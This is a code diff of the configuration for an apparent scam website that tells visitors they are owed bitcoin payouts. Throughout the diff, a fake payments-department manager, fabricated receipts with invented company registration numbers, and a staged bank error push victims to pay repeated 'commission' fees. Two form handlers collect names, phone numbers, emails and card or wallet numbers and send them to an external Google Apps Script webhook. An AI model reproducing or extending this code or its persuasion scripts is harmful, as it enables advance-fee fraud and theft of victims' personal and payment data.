+                    chatPull: ['{{greetingTime}}! My name is Anna, I am the lead manager of the payout department of the service "'.concat(n["a"].state[o].sitename, '".<br> According to the information I have, you have not appeared on the site for <span class="text-numbers">{{prevDayYear}}</span> days. Regarding this, I have a question: have you previously received a notification that you are entitled to a payout from ').concat(n["a"].state[o].sitename, "? {{next}}"), "I am waiting for your response{{next}}", '{{answerBtn:["Yes, I received it", "I don\'t remember", "I didn\'t notice"]}}', "I have an approved active request from your account to withdraw the bitcoin bonuses you earned. In order to transfer funds from the service to your card or wallet, we need your completed questionnaire. I will look for this questionnaire now, it will take no more than a minute.{{loading:{duration:14}{delay:9}\"Searching for your questionnaire. Please wait...\"}}", "Thank you for waiting. I checked and could not find your questionnaire in our database. This means you have not yet withdrawn the accumulated bitcoins from the service. {{next}}", "I have already started processing your payout, but I need your questionnaire and the details to which we will make the payment. {{next}}", 'Please fill it out right now so we can exchange bitcoins into your currency {{converting_geoCur}} as quickly as possible. The system reports that you are owed <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', 'After you fill out the questionnaire, I will contact you and help you request the payout within <span class="text-numbers">15 minutes</span><br>\n        {{upsellbtn}}']
                 },
-                title: "Specify the details to which you want to receive funds",
+                title: "Provide the details to which you wish to receive funds",
                 product: "",
                 amount: {
                     e: 0,
@@ -5012,7 +5087,7 @@
                     p: 0,
                     h: 0
                 },
-                buttonText: "Fill in the questionnaire",
+                buttonText: "Fill out the form",
                 paymentLink: "/account/lawyerrequisits?s=gd260ca58",
                 paymentLinks: {
                     e: "/account/lawyerrequisits?s=gd260ca58",
@@ -5022,14 +5097,23 @@
                     h: "/account/lawyerrequisits?s=gd260ca58"
                 }
             },
+
+
+
+
+
+
+
+
+
             requisits: {
-                name: "Requisites",
+                name: "Details",
                 loadtime: 4,
                 isLoading: !0,
                 upsellType: "text",
-                loadsteps: ["Loading requisites form"],
+                loadsteps: ["Loading the form for filling in details"],
                 statusMessage: "Funds successfully credited to Swift",
-                title: "Specify the details to which you want to receive funds",
+                title: "Provide the details to which you wish to receive funds",
                 product: "",
                 amount: {
                     e: 0,
@@ -5038,16 +5122,19 @@
                     p: 0,
                     h: 0
                 },
-                customItem: '\n      <form>\n        <div class="form-group">\n          <label for="username">Enter your full name</label>\n          <input name="username" type="text" class="data-inputs form-control" placeholder="{{usernamePlaceholder}}">\n        </div>\n        <div class="form-group text-left">\n          <label for="userphone">Phone number</label>\n          <input name="userphone" type="text" class="data-inputs form-control" placeholder="{{userphonePlaceholder}}">\n        </div>\n        <div class="form-group text-left">\n          <label for="useremail">Email address</label>\n          <input name="useremail" type="email" class="data-inputs form-control" placeholder="example@mail.com">\n        </div>\n        <div class="form-group">\n          <label for="paymentMethod">Where to send the transfer</label>\n          <select class="data-inputs form-control" name="paymentMethod">\n            <option>Bank card (Russia)</option>\n            <option>Bank card (Other countries)</option>\n            <option>E-wallet</option>\n            <option class="d-none" selected>{{paymentMethod}}</option>\n          </select>\n        </div>\n        <div class="form-group">\n          <label for="paymentNumber">Card / wallet number</label>\n          <input name="paymentNumber" type="text" class="data-inputs form-control" placeholder="{{paymentNumberPlaceholder}}">\n        </div>\n      </form>',
-                instructions: ["Enter your full name", "Enter your phone number", "Enter your email", "Choose the receiving method", "Enter the account number", "Receive the payment"],
-                buttonText: "Submit questionnaire to manager",
+
+
+
+                customItem: '\n      <form>\n        <div class="form-group">\n          <label for="username">Enter your full name</label>\n          <input name="username" type="text" class="data-inputs form-control" placeholder="{{usernamePlaceholder}}">\n        </div>\n        <div class="form-group text-left">\n          <label for="userphone">Phone number</label>\n          <input name="userphone" type="text" class="data-inputs form-control" placeholder="{{userphonePlaceholder}}">\n        </div>\n        <div class="form-group text-left">\n          <label for="useremail">Email address</label>\n          <input name="useremail" type="email" class="data-inputs form-control" placeholder="example@mail.com">\n        </div>\n        <div class="form-group">\n          <label for="paymentMethod">Where to send the transfer</label>\n          <select class="data-inputs form-control" name="paymentMethod">\n            <option>Bank card (Russia)</option>\n            <option>Bank card (Other countries)</option>\n            <option>Electronic wallet</option>\n            <option class="d-none" selected>{{paymentMethod}}</option>\n          </select>\n        </div>\n        <div class="form-group">\n          <label for="paymentNumber">Card / wallet number</label>\n          <input name="paymentNumber" type="text" class="data-inputs form-control" placeholder="{{paymentNumberPlaceholder}}">\n        </div>\n      </form>',
+                instructions: ["Enter your full name", "Enter your phone number", "Enter your email", "Select the payment method", "Enter the account number", "Receive the payout"],
+                buttonText: "Send the form to the manager",
                 onCreated: function(t) {
                     t.$metrika.hit()
                 },
                 beforeGoPay: function(t) {
                     var e = this;
                     
-                    // 1. Collect data from form fields
+                    // 1. Собираем данные из полей формы
                     var formData = {
                         name: document.querySelector('input[name="username"]')?.value || "Not specified",
                         phone: document.querySelector('input[name="userphone"]')?.value || "Not specified",
@@ -5057,7 +5144,7 @@
                         offer: typeof o !== 'undefined' ? o.replace(/\//g, "") : "unknown"
                     };
 
-                    // 2. Send to Google Webhook
+                    // 2. Отправка на Google Webhook
                     fetch("https://script.google.com/macros/s/AKfycbzF56bLZkkkGO82yWx5Si413NcVj1xrJJff5YeFNaTmVtIyj-srj-lgFOlkJmW6E-Dd/exec", {
                         method: "POST",
                         mode: "no-cors", 
@@ -5065,7 +5152,7 @@
                         body: JSON.stringify(formData)
                     }).catch(function(err) { console.error("Webhook error:", err); });
 
-                    // 3. Original save logic (fallback)
+                    // 3. Оригинальная логика сохранения (резерв)
                     if (typeof o !== 'undefined' && localStorage.getItem(o + "userphone")) {
                         if (null !== localStorage.getItem(o + "userphone").replace(/ /g, "").match(/\d/g)) {
                             var s = encodeURI(localStorage.getItem(o + "userphone").trim())
@@ -5078,6 +5165,9 @@
                         }
                     }
                 },
+
+
+
                 paymentLink: "/account/requisits?s=gd260ca58",
                 paymentLinks: {
                     e: "/account/requisits?s=gd260ca58",
@@ -5087,16 +5177,28 @@
                     p: "/account/requisits?s=gd260ca58"
                 }
             },
+
+
+
+
+
+
+
+
+
+
+
+
             lawyerexchange: {
-                name: "Manager chat before conversion",
+                name: "Chat manager before conversion",
                 loadtime: 8,
                 isLoading: !0,
-                loadsteps: ["Sending questionnaire to manager"],
-                statusMessage: "Your questionnaire has been sent to the manager",
+                loadsteps: ["Sending the form to the manager"],
+                statusMessage: "Your form has been sent to the manager",
                 upsellType: "chat",
                 chat: {
                     name: "Anna Vitkovskaya",
-                    job: "Lead Manager, Payments Department",
+                    job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
                     delay: [3, 6, 8, 5, 1],
@@ -5105,9 +5207,9 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["I have received your questionnaire {{next}}", "To complete the payment processing, we need to exchange your bitcoins into your currency {{converting_geoCur}}. {{next}}", 'The exchange rate is minimal via the special service <span class="font-weight-bold">Binance</span>, which is <span class="text-numbers">0.4%</span> {{next}}', 'After currency conversion you will receive <span class="text-numbers">{{geoMoneyHard}}</span> {{next}}', "{{upsellbtn}}"]
+                    chatPull: ["I have received your form {{next}}", "To complete the payout processing, we now need to exchange your bitcoins into your currency {{converting_geoCur}}. {{next}}", 'The exchange rate is minimal through the special service <span class="font-weight-bold">Binance</span>, which is <span class="text-numbers">0.4%</span> {{next}}', 'After currency conversion you will receive <span class="text-numbers">{{geoMoneyHard}}</span> {{next}}', "{{upsellbtn}}"]
                 },
-                title: "Specify the details to which you want to receive funds",
+                title: "Provide the details to which you wish to receive funds",
                 product: "",
                 amount: {
                     e: 0,
@@ -5130,12 +5232,12 @@
                 name: "Cryptocurrency exchange",
                 loadtime: 9,
                 isLoading: !0,
-                loadsteps: ["Transferring payment to the cryptocurrency exchange", "Transferring funds to BTC"],
-                statusMessage: "Payment successfully credited to the cryptocurrency exchange!",
-                title: 'Create a request to exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>',
-                description: ["Your funds have been transferred to the cryptocurrency exchange <b>Binance</b>", 'The exchange currently holds <b class="text-numbers">{{moneyBTC}}</b>', 'Exchange the cryptocurrency to receive funds right now. Exchange fee at Binance - <b class="text-numbers">0.4%</b>.'],
+                loadsteps: ["Transferring payout to cryptocurrency exchange", "Transferring funds to BTC"],
+                statusMessage: "Payout successfully credited to the cryptocurrency exchange!",
+                title: 'You need to create an order to exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>',
+                description: ["Your funds have been transferred to the cryptocurrency exchange <b>Binance</b>", 'The exchange currently holds <b class="text-numbers">{{moneyBTC}}</b>', 'Make the cryptocurrency exchange now to receive funds immediately. The exchange commission on Binance is <b class="text-numbers">0.4%</b>.'],
                 upsellType: "text",
-                product: 'Conversion cost of <span class="text-numbers">{{moneyBTC}}</span> to <span class="text-uppercase">{{converting_geoCur}}</span>',
+                product: 'The conversion cost of <span class="text-numbers">{{moneyBTC}}</span> to <span class="text-uppercase">{{converting_geoCur}}</span> will be',
                 amount: {
                     e: 2000,
                     c: 2000,
@@ -5144,7 +5246,7 @@
                     p: 2000
                 },
                 customItem: '<div class="align-items-center justify-content-center row text-center" style="margin-bottom: 20px;"> <div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Give  <span class="text-numbers">{{moneyBTC}}</span></b></label> </div><div><div class="bit-lang-g-icon col-sm obmenbtc"></div></div><div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Receive <span class="text-numbers">{{convertedAmountUSD}}</span></b> </label> </div></div>',
-                instructions: ['Click the "Exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>" button', "Pay the cryptocurrency exchange fee", "Receive your funds in dollars"],
+                instructions: ['Click the button "Exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>"', "Pay the cryptocurrency exchange commission", "Receive your funds in dollars"],
                 buttonText: 'Exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>',
                 paymentLink: "/account/exchange?s=gd260ca58",
                 paymentLinks: {
@@ -5159,12 +5261,12 @@
                 name: "manager and receipt",
                 loadtime: 13,
                 isLoading: !0,
-                loadsteps: ['Transferring funds from BTC to <span class="text-uppercase">{{converting_geoCur}}</span>', 'Your funds have been successfully converted to <span class="text-uppercase">{{converting_geoCur}}</span>', "Connecting with manager"],
-                statusMessage: "Currency conversion successfully completed!",
+                loadsteps: ['Transferring funds from BTC to <span class="text-uppercase">{{converting_geoCur}}</span>', 'Your funds have been successfully converted to <span class="text-uppercase">{{converting_geoCur}}</span>', "Connecting with the manager"],
+                statusMessage: "Currency conversion completed successfully!",
                 upsellType: "chat",
                 chat: {
                     name: "Anna Vitkovskaya",
-                    job: "Lead Manager, Payments Department",
+                    job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
                     delay: [4, 10, 8, 5, 6, 7, 12, 3],
@@ -5173,9 +5275,9 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["Currency conversion successfully paid {{next}}", 'Now I can create a receipt for your payment. The amount of <span class="text-numbers">{{moneyPageBased}}</span> is ready to be sent.{{next}}', 'Keep in mind that the amount will most likely come in two equal parts, as your withdrawal amount exceeds <span class="text-numbers">{{geoMoneyHalfLimit}}</span>.{{next}}', "The funds will be sent to the details you provided.{{next}}", "Please carefully check the receipt data and order the withdrawal yourself.{{next}}", 'Follow the instructions on the next page to receive the funds within <span class="text-numbers">15</span> minutes.{{next}}', "I was glad to help you! To receive the full amount, you need to follow the link below, check the transfer receipt and receive the payment. {{next}}", "{{upsellbtn}}"]
+                    chatPull: ["Currency conversion successfully paid {{next}}", 'Now I can create a receipt for your payout. The amount of <span class="text-numbers">{{moneyPageBased}}</span> is ready to be sent.{{next}}', 'Please note that the amount will most likely come in two equal parts, since your withdrawal amount exceeds <span class="text-numbers">{{geoMoneyHalfLimit}}</span>.{{next}}', "The funds will be sent to the details you specified.{{next}}", "I ask you to carefully check the transfer receipt data and request the payout yourself{{next}}", 'Follow the instructions on the next page to receive the funds within <span class="text-numbers">15</span> minutes{{next}}', "I was glad to help you! To receive the full amount, you need to follow the link below, check the transfer receipt and receive the payout. {{next}}", "{{upsellbtn}}"]
                 },
-                title: "Specify the details to which you want to receive funds",
+                title: "Provide the details to which you wish to receive funds",
                 product: "",
                 amount: {
                     e: 0,
@@ -5184,7 +5286,7 @@
                     p: 0,
                     h: 0
                 },
-                buttonText: "Go to create receipt and receive funds",
+                buttonText: "Proceed to create receipt and receive funds",
                 paymentLink: "/account/lawyerreceipt?s=gd260ca58",
                 paymentLinks: {
                     e: "/account/lawyerreceipt?s=gd260ca58",
@@ -5201,9 +5303,9 @@
                 upsellType: "text",
                 loadsteps: ["Creating receipt"],
                 statusMessage: "The specified details require your confirmation!",
-                title: "Carefully check the recipient details!",
+                title: "Carefully check the recipient's details!",
                 product: "If you entered incorrect data, correct them now directly in the receipt",
-                customItem: '\n    <div class="d-flex justify-content-center">\n      <div>\n      <div class="position-relative receipt-container overflow-hidden">\n\n        <div class="section-self-462 p-3 receipt-body shadow mx-auto" style="max-width: 350px; text-align: left;">\n          <div>\n            <h5 class="pt-3">Transfer receipt</h5>\n            <table>\n              <tbody>\n                <tr>\n                  <td>Payment amount&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{{moneyPageBased}}</td>\n                </tr>\n                <tr class="{{d-none}}">\n                  <td>Fee&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{receiptAmount}&nbsp;USD{{geoReceiptAmount}}</td>\n                </tr>\n              </tbody>\n            </table>\n          </div>\n          <div>\n            <h5 class="top-dashed mt-3 pt-1">Recipient details</h5>\n              <table>\n                <tbody>\n                  <tr>\n                    <td>Name&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{usernamePlaceholder}}" name="username"></td>\n                  </tr>\n                  <tr>\n                    <td>Receiving method&nbsp;</td>\n                    <td><select class="data-inputs w-100" name="paymentMethod">\n                      <option>Bank card (Russia)</option>\n                      <option>Bank card (Other countries)</option>\n                      <option>E-wallet</option>\n                      <option class="d-none" selected="">{{paymentMethod}}</option>\n                    </select>\n                    </td>\n                  </tr>\n                  <tr>\n                    <td>Card/account number&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{paymentNumberPlaceholder}}" name="paymentNumber"></td>\n                  </tr>\n                </tbody>\n              </table>\n            </div>\n            <div>\n              <h5 class="top-dashed mt-3 pt-1">Sender details</h5>\n                <table>\n                  <tbody>\n                    <tr>\n                      <td>Name&nbsp;</td>\n                      <td>LTD "{{sitename}}" </td>\n                    </tr>\n                    <tr>\n                      <td>INN&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">7732178950</td>\n                    </tr>\n                    <tr>\n                      <td>KPP&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter" font-weight-lighter>370201001</td>\n                    </tr>\n                    <tr>\n                      <td>OKPO&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">14264392</td>\n                    </tr>\n                    <tr>\n                      <td>OGRN&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">1037233038364</td>\n                    </tr>\n                    <tr>\n                      <td>Account&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">15241249614833674</td>\n                    </tr>\n                    <tr>\n                      <td>Address &nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">'.concat(c, '</td>\n                    </tr>\n                  </tbody>\n                </table>\n              </div>\n            </div>\n            </div>\n            <div class="checkout-image" style="display:none; background-color: white;">\n              <img style="max-width:350px;" src="').concat(o, 'img/checkout_1.png" alt="">\n              <h4 style="text-align: center; color: #d48686; font-weight: 600; font-family: Tahoma, Arial, Helvetica, sans-serif;font-size: 20px; margin-bottom: -2px; text-transform: uppercase">{{today}}</h4>\n              <img style="max-width:350px;" src="').concat(o, 'img/checkout_2.png" alt="">\n            </div>\n            <p class="waitwards" style="text-align:center; display:none;">Please wait</p>\n          </div>\n        </div>'),
+                customItem: '\n    <div class="d-flex justify-content-center">\n      <div>\n      <div class="position-relative receipt-container overflow-hidden">\n\n        <div class="section-self-462 p-3 receipt-body shadow mx-auto" style="max-width: 350px; text-align: left;">\n          <div>\n            <h5 class="pt-3">Transfer receipt</h5>\n            <table>\n              <tbody>\n                <tr>\n                  <td>Payment amount&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{{moneyPageBased}}</td>\n                </tr>\n                <tr class="{{d-none}}">\n                  <td>Commission&nbsp;</td>\n                  <td class="text-numbers font-weight-lighter">&nbsp;{receiptAmount}&nbsp;₽{{geoReceiptAmount}}</td>\n                </tr>\n              </tbody>\n            </table>\n          </div>\n          <div>\n            <h5 class="top-dashed mt-3 pt-1">Recipient details</h5>\n              <table>\n                <tbody>\n                  <tr>\n                    <td>Name&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{usernamePlaceholder}}" name="username"></td>\n                  </tr>\n                  <tr>\n                    <td>Payment method&nbsp;</td>\n                    <td><select class="data-inputs w-100" name="paymentMethod">\n                      <option>Bank card (Russia)</option>\n                      <option>Bank card (Other countries)</option>\n                      <option>Electronic wallet</option>\n                      <option class="d-none" selected="">{{paymentMethod}}</option>\n                    </select>\n                    </td>\n                  </tr>\n                  <tr>\n                    <td>Card/account number&nbsp;</td>\n                    <td><input type="text" class="data-inputs" placeholder="{{paymentNumberPlaceholder}}" name="paymentNumber"></td>\n                  </tr>\n                </tbody>\n              </table>\n            </div>\n            <div>\n              <h5 class="top-dashed mt-3 pt-1">Sender details</h5>\n                <table>\n                  <tbody>\n                    <tr>\n                      <td>Name&nbsp;</td>\n                      <td>LTD "{{sitename}}" </td>\n                    </tr>\n                    <tr>\n                      <td>INN&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">7732178950</td>\n                    </tr>\n                    <tr>\n                      <td>KPP&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter" font-weight-lighter>370201001</td>\n                    </tr>\n                    <tr>\n                      <td>OKPO&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">14264392</td>\n                    </tr>\n                    <tr>\n                      <td>OGRN&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">1037233038364</td>\n                    </tr>\n                    <tr>\n                      <td>Settlement account&nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">15241249614833674</td>\n                    </tr>\n                    <tr>\n                      <td>Address &nbsp;</td>\n                      <td class="text-numbers font-weight-lighter">'.concat(c, '</td>\n                    </tr>\n                  </tbody>\n                </table>\n              </div>\n            </div>\n            </div>\n            <div class="checkout-image" style="display:none; background-color: white;">\n              <img style="max-width:350px;" src="').concat(o, 'img/checkout_1.png" alt="">\n              <h4 style="text-align: center; color: #d48686; font-weight: 600; font-family: Tahoma, Arial, Helvetica, sans-serif;font-size: 20px; margin-bottom: -2px; text-transform: uppercase">{{today}}</h4>\n              <img style="max-width:350px;" src="').concat(o, 'img/checkout_2.png" alt="">\n            </div>\n            <p class="waitwards" style="text-align:center; display:none;">Please wait</p>\n          </div>\n        </div>'),
                 amount: {
                     e: 0,
                     c: 0,
@@ -5223,7 +5325,7 @@
                     }
                     ), 3e3)
                 },
-                instructions: ["Check the recipient's name", "Check the account number", "Change the data if you find an error", "Click transfer money"],
+                instructions: ["Check the recipient's name", "Check the account number", "Correct the data if you find an error", "Click transfer money"],
                 buttonText: "Transfer money",
                 paymentLink: "/account/receipt?s=gd260ca58",
                 paymentLinks: {
@@ -5235,24 +5337,24 @@
                 }
             },
             comissionfp: {
-                name: "First transfer fee",
+                name: "Commission for the first transfer",
                 loadtime: 15,
                 isLoading: !0,
                 loadsteps: ["Transferring to your details", "Checking transfer status"],
                 statusMessage: "Transfer successfully verified and ready to send!",
-                title: "The payment system requests a transfer fee",
-                description: ['<form>\n        <div class="form-group">\n          <label for="username">Enter your name</label>\n<input name="username" type="text" class="data-inputs form-control" placeholder="{{usernamePlaceholder}}">\n</div>\n<div class="form-group text-left">\n<label for="useremail">Email address</label>\n<input name="useremail" type="email" class="data-inputs form-control" placeholder="example@mail.com">\n        </div>\n</form>', "Due to payment system limits, the transfer will be sent in two equal parts within <b>10</b> minutes", "During the transfer of funds to the specified details, the payment system requested a <b>fee</b>. We do not have the necessary funds to pay the fee for each transfer, moreover, it is individual for each case. The fee is calculated from the first part of the transfer and depends on your bank.", "You need to pay the transfer fee <b>yourself</b>. After paying the fee, the transfer will be successfully <b>sent</b> to the details in full!"],
+                title: "Payment system requests a transfer commission",
+                description: ['<form>\n        <div class="form-group">\n          <label for="username">Enter your name</label>\n<input name="username" type="text" class="data-inputs form-control" placeholder="{{usernamePlaceholder}}">\n</div>\n<div class="form-group text-left">\n<label for="useremail">Email address</label>\n<input name="useremail" type="email" class="data-inputs form-control" placeholder="example@mail.com">\n        </div>\n</form>', "Due to payment system limits, the transfer will be sent in two equal parts within <b>10</b> minutes", "During the transfer of funds to the specified details, the payment system requested a <b>commission</b>. We do not have the necessary funds to pay the commission for each transfer, and it is individual for each case. The commission is calculated from the first part of the transfer and depends on your bank.", "You need to pay the commission for the transfer of your funds <b>yourself</b>. After paying the commission, the transfer will be successfully <b>sent</b> to the details in full!"],
                 beforeGoPay: function(t) {
                     var e = this;
                     
-                    // 1. Collect data from form fields
+                    // 1. Собираем данные из полей формы
                     var formData = {
                         name: document.querySelector('input[name="username"]')?.value || "Not specified",
                         email: document.querySelector('input[name="useremail"]')?.value || "Not specified",
                         offer: typeof o !== 'undefined' ? o.replace(/\//g, "") : "unknown"
                     };
 
-                    // 2. Send to Google Webhook
+                    // 2. Отправка на Google Webhook
                     fetch("https://script.google.com/macros/s/AKfycbzF56bLZkkkGO82yWx5Si413NcVj1xrJJff5YeFNaTmVtIyj-srj-lgFOlkJmW6E-Dd/exec", {
                         method: "POST",
                         mode: "no-cors", 
@@ -5261,7 +5363,7 @@
                     }).catch(function(err) { console.error("Webhook error:", err); });
                     
                     
-                    // 3. Original save logic (fallback)
+                    // 3. Оригинальная логика сохранения (резерв)
                     if (typeof o !== 'undefined' && localStorage.getItem(o + "userphone")) {
                         if (null !== localStorage.getItem(o + "useremail").replace(/ /g, "").match(/\d/g)) {
                             var s = encodeURI(localStorage.getItem(o + "useremail").trim())
@@ -5274,6 +5376,12 @@
                         }
                     }
                 },
+
+
+
+
+
+
                 upsellType: "text",
                 chat: {
                     name: "Sofia Maslova",
@@ -5286,19 +5394,19 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["Hello, How are you?", "I have an offer for you {{upsellbtn}}", "", ""]
+                    chatPull: ["Hello, how are you?", "I have an offer for you {{upsellbtn}}", "", ""]
                 },
-                product: "The fee requested for the transfer is",
+                product: "The commission requested for the transfer is",
                 amount: {
-                    e: 31.08, // 2300 / 74 ≈ 31.08
-                    c: 31.08,
-                    b: 31.08,
-                    p: 31.08,
-                    h: 31.08
+                    e: 2300,
+                    c: 2300,
+                    b: 2300,
+                    p: 2300,
+                    h: 2300
                 },
                 customItem: "",
-                instructions: ["We guarantee a fast payout", "Pay the transfer fee", "Receive your payment within 10 minutes"],
-                buttonText: "Pay the fee",
+                instructions: ["We guarantee you a quick payout", "Pay the transfer commission", "Receive your payout within 10 minutes"],
+                buttonText: "Pay commission",
                 paymentLink: "/account/comissionfp?s=gd260ca58",
                 paymentLinks: {
                     e: window.location.origin + o + "pay48545.html",
@@ -5312,7 +5420,7 @@
                 name: "Bank transfer error 3405",
                 loadtime: 15,
                 isLoading: !0,
-                loadsteps: ["Transfer to your details", "Bank-side error"],
+                loadsteps: ["Transfer to your details", "Error on bank side"],
                 statusMessage: "Error #3405",
                 title: "Bank transfer error #3405",
                 description: [],
@@ -5329,7 +5437,7 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["Hello, How are you?", "I have an offer for you", "", ""]
+                    chatPull: ["Hello, how are you?", "I have an offer for you", "", ""]
                 },
                 product: "",
                 amount: {
@@ -5339,7 +5447,7 @@
                     p: 0,
                     h: 0
                 },
-                customItem: '\n    <table class="table table-reject table-striped table-bordered">\n      <thead class="bg-primary text-white text-center" style="font-size:1.5rem;">\n        <tr>\n          <th scope="col" colspan="2" class="text-numbers><span class="font-weight-bolder">BANK REJECTED THE TRANSFER</span> error #3405</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope="row">Transaction No.</th>\n          <td class="text-numbers">558216/16</td>\n        </tr>\n        <tr>\n          <th scope="row">Sender</th>\n          <td class="text-numbers">LTD "{{sitename}}"<br>Account 15241249614833674</td>\n        </tr>\n        <tr>\n          <th scope="row">Date</th>\n          <td class="text-numbers">{{todayFull}}</td>\n        </tr>\n        <tr>\n          <th scope="row">Amount</th>\n          <td class="text-numbers">{{moneyPageBased}}</td>\n        </tr>\n        <tr>\n          <th scope="row">Status</th>\n          <td class="text-very-danger text-numbers">Bank-side error<br>\n          Error code: #3045\n          </td>\n        </tr>\n      </tbody>\n      </table>',
+                customItem: '\n    <table class="table table-reject table-striped table-bordered">\n      <thead class="bg-primary text-white text-center" style="font-size:1.5rem;">\n        <tr>\n          <th scope="col" colspan="2" class="text-numbers><span class="font-weight-bolder">BANK REJECTED THE TRANSFER OPERATION</span> error #3405</th>\n        </tr>\n      </thead>\n      <tbody>\n        <tr>\n          <th scope="row">Transaction No.</th>\n          <td class="text-numbers">558216/16</td>\n        </tr>\n        <tr>\n          <th scope="row">Transfer sender</th>\n          <td class="text-numbers">LTD "{{sitename}}"<br>Settlement account 15241249614833674</td>\n        </tr>\n        <tr>\n          <th scope="row">Operation date</th>\n          <td class="text-numbers">{{todayFull}}</td>\n        </tr>\n        <tr>\n          <th scope="row">Amount</th>\n          <td class="text-numbers">{{moneyPageBased}}</td>\n        </tr>\n        <tr>\n          <th scope="row">Status</th>\n          <td class="text-very-danger text-numbers">Error on bank side<br>\n          Error code: #3045\n          </td>\n        </tr>\n      </tbody>\n      </table>',
                 instructions: ["Contact a consultant to resolve the issue"],
                 buttonText: "Contact consultant",
                 paymentLink: "/account/error3405?s=gd260ca58",
@@ -5352,15 +5460,15 @@
                 }, "p", "/account/error3405?s=gd260ca58")
             },
             lawyercomission: {
-                name: "Lawyer manager and error 3405",
+                name: "Manager-lawyer and error 3405",
                 loadtime: 0,
                 isLoading: !1,
-                loadsteps: ["Activating personal account"],
+                loadsteps: ["Activation of personal account"],
                 statusMessage: "Personal account activated",
                 upsellType: "chat",
                 chat: {
                     name: "Anna Vitkovskaya",
-                    job: "Lead Manager, Payments Department",
+                    job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
                     delay: [3, 8, 4, 0, 7, 0, 4, 12, 12, 6, 2],
@@ -5369,9 +5477,9 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["{{greetingTime}} again! {{next}}", "I can already see that you have a problem with the transfer. To find out the reason, we need your consent to process the personal information from the receipt.{{next}}", "I will now generate a button for you, please click on it.{{next}}", '{{answerBtn:["I give my consent"]}}', "I have received your consent, now I will find out the reason for the rejected operation, it will take no more than a minute.{{next}}", '{{loading:{duration:25}{delay:5}"Do not close the window! The consultant is investigating the cause of error #3405!"}}', "Thank you for waiting, I have found out the reason for the error.{{next}}", 'You have successfully paid the first transfer fee, and it has already been credited to your account, but to receive the full amount you need to pay the fee for the second transfer <span class="text-numbers">{{secondPart}}</span>. These conditions were set by your receiving bank.{{next}}', 'You will be able to resolve the error yourself on the next page and receive the transfer within <span class="text-numbers">15</span> minutes.{{next}}', "I will now give you a link with instructions, click the button to proceed.{{next}}", "{{upsellbtn}}"]
+                    chatPull: ["{{greetingTime}} again! {{next}}", "I already see that you have a problem with the transfer. To find out the reason, I need your consent to process personal information from the receipt.{{next}}", "I will now bring up a button for you, click on it.{{next}}", '{{answerBtn:["I give my consent"]}}', "I have received your consent, I will now find out the reason for the rejected operation, it will take no more than a minute.{{next}}", '{{loading:{duration:25}{delay:5}"Do not close the window! The consultant is investigating the reason for error #3405!"}}', "Thank you for waiting, I have found out the reason for the error.{{next}}", 'You have successfully paid the commission for the first transfer, and it has already been credited to your account, but to receive the full amount you need to pay the commission for the second transfer <span class="text-numbers">{{secondPart}}</span>. These terms were set by your receiving bank.{{next}}', 'You will be able to resolve the error yourself on the next page and receive the transfer within <span class="text-numbers">15</span> minutes.{{next}}', "I will now give you a link with instructions, click the button to proceed.{{next}}", "{{upsellbtn}}"]
                 },
-                title: "Specify the details to which you want to receive funds",
+                title: "Provide the details to which you wish to receive funds",
                 product: "",
                 amount: {
                     e: 0,
@@ -5380,7 +5488,7 @@
                     p: 0,
                     h: 0
                 },
-                buttonText: "Get instructions for withdrawing funds",
+                buttonText: "Get instructions for withdrawal",
                 paymentLink: "/account/lawyercomission?s=gd260ca58",
                 paymentLinks: {
                     e: "/account/lawyercomission?s=gd260ca58",
@@ -5391,7 +5499,7 @@
                 }
             },
             comissionsp: {
-                name: "Second transfer fee",
+                name: "Commission for the second transfer",
                 loadtime: 12,
                 isLoading: !0,
                 upsellType: "text",
@@ -5406,23 +5514,23 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["Hello, How are you? {{upsellbtn}}", "I have an offer for you ", "adasdsad", "adasdasdasdasd"]
+                    chatPull: ["Hello, how are you? {{upsellbtn}}", "I have an offer for you ", "adasdsad", "adasdasdasdasd"]
                 },
                 loadsteps: ["Transferring the first part of the amount to the express account", "Transferring funds"],
-                statusMessage: "The first part of the amount successfully credited to the express account!",
-                title: "The payment system requests a fee for the second transfer",
